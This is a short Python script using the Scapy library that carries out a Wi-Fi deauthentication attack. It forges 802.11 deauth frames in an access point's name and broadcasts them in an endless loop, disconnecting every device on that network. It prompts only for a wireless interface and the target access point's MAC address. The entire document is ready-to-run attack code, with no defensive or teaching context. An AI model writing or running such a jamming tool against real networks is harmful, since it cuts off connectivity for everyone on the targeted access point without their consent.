from scapy.all import *
import time

def deauth_attack(interface, target_mac, ap_mac):
    """
    Perform a deauthentication attack to disconnect devices from the AP.

    :param interface: Network interface to use (e.g., 'wlan0')
    :param target_mac: MAC address of the target device (use 'ff:ff:ff:ff:ff:ff' for all devices)
    :param ap_mac: MAC address of the access point
    """
    # Constructing the deauthentication packet
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    pkt = RadioTap()/dot11/Dot11Deauth()
    
    # Send the packet in a loop
    print(f"Sending deauth packets to {target_mac} on AP {ap_mac}")
    while True:
        sendp(pkt, iface=interface, verbose=False)
        time.sleep(1)

if __name__ == "__main__":
    # Prompt the user for network interface and AP MAC address
    interface = input("Enter the network interface (e.g., 'wlan0'): ")
    ap_mac = input("Enter the MAC address of the access point (e.g., '00:11:22:33:44:55'): ")
    target_mac = "ff:ff:ff:ff:ff:ff"  # Broadcast to all devices

    # Confirm details with the user
    print(f"Interface: {interface}")
    print(f"Access Point MAC: {ap_mac}")

    # Start the deauthentication attack
    deauth_attack(interface, target_mac, ap_mac)

